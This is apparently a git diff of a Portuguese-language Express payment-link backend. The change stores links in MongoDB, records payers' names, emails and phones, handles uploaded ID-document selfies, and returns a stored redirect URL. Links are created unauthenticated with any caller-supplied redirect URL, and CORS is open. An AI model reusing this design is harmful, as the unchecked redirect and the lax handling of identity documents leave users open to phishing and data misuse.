@@ -5,12 +5,34 @@ const { v4: uuidv4, validate: uuidValidate } = require('uuid');
 const rateLimit = require('express-rate-limit');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
+
+// Conexão com o MongoDB Atlas
+const mongoose = require('mongoose');
+mongoose.connect(process.env.MONGODB_URI)
+    .then(() => console.log('Conectado ao MongoDB!'))
+    .catch(err => console.error('Erro na conexão:', err));
+
+// Modelo para os links de pagamento
+const PaymentLink = mongoose.model('PaymentLink', new mongoose.Schema({
+    linkId: { type: String, unique: true, required: true },
+    redirectUrl: { type: String, required: true },
+    createdAt: { type: Date, default: Date.now },
+    status: { type: String, default: 'pending' }
+}));
+
+// Modelo para os pagamentos
+const Payment = mongoose.model('Payment', new mongoose.Schema({
+    linkId: { type: String, required: true },
+    nome: { type: String, required: true },
+    email: { type: String, required: true },
+    telefone: { type: String, required: true },
+    createdAt: { type: Date, default: Date.now },
+    status: { type: String, default: 'processing' }
+}));
 
 // Rate Limiting (5 requisições/minuto por IP)
 const limiter = rateLimit({
@@ -48,12 +70,54 @@ const transporter = nodemailer.createTransport({
 });
 
 // Rota para gerar links únicos
-app.post('/api/generate-link', (req, res) => {
-    const uniqueId = uuidv4();
-    res.json({
-        link: uniqueId,
-        fullUrl: `${process.env.FRONTEND_URL || 'https://seu-frontend.vercel.app'}/pagamento/${uniqueId}`
-    });
+app.post('/api/generate-link', async (req, res) => {
+    try {
+        const { redirectUrl } = req.body;
+
+        if (!redirectUrl) {
+            return res.status(400).json({ error: 'URL de redirecionamento é obrigatória' });
+        }
+
+        const linkId = uuidv4();
+
+        // Salva no banco de dados
+        await PaymentLink.create({
+            linkId,
+            redirectUrl
+        });
+
+        res.json({
+            link: linkId,
+            fullUrl: `${process.env.FRONTEND_URL || 'https://seu-frontend.vercel.app'}/pagamento/${linkId}`
+        });
+    } catch (error) {
+        console.error('Erro ao gerar link:', error);
+        res.status(500).json({ error: 'Erro ao gerar link' });
+    }
+});
+
+app.get('/api/link-data/:linkId', async (req, res) => {
+    try {
+        const { linkId } = req.params;
+
+        if (!uuidValidate(linkId)) {
+            return res.status(400).json({ error: 'Link inválido' });
+        }
+
+        const linkData = await PaymentLink.findOne({ linkId });
+
+        if (!linkData) {
+            return res.status(404).json({ error: 'Link não encontrado' });
+        }
+
+        res.json({
+            redirectUrl: linkData.redirectUrl,
+            status: linkData.status
+        });
+    } catch (error) {
+        console.error('Erro ao buscar link:', error);
+        res.status(500).json({ error: 'Erro ao buscar link' });
+    }
 });
 
 // Rota para processar pagamento
@@ -64,15 +128,28 @@ app.post('/api/submit-payment', upload.fields([
     try {
         const { nome, email, telefone, linkId } = req.body;
 
-        // Validação do UUID do link
+        // Validações
         if (!uuidValidate(linkId)) {
         return res.status(400).json({ error: 'Link inválido!' });
         }
 
-        // Validação dos dados (Zod opcional)
         if (!nome || !email || !telefone) {
         return res.status(400).json({ error: 'Dados incompletos!' });
         }
+
+        const linkExists = await PaymentLink.findOne({ linkId });
+        if (!linkExists) {
+            return res.status(404).json({ error: 'Link não encontrado!' });
+        }
+
+        await Payment.create({
+            linkId,
+            nome,
+            email,
+            telefone
+        });
+
+        await PaymentLink.updateOne({ linkId }, { status: 'completed' });
 
         const generateClientEmailHTML = (nome, linkId) => {
             return `
@@ -325,7 +402,11 @@ app.post('/api/submit-payment', upload.fields([
             req.files.selfieDocumento[0].buffer = null;
         }, 3600000);
 
-        res.json({ success: true });
+        res.json({
+            success: true,
+            redirectUrl: linkExists.redirectUrl
+        });
+
     } catch (error) {
         console.error('Erro:', error);
         res.status(500).json({ error: 'Erro no servidor.' });
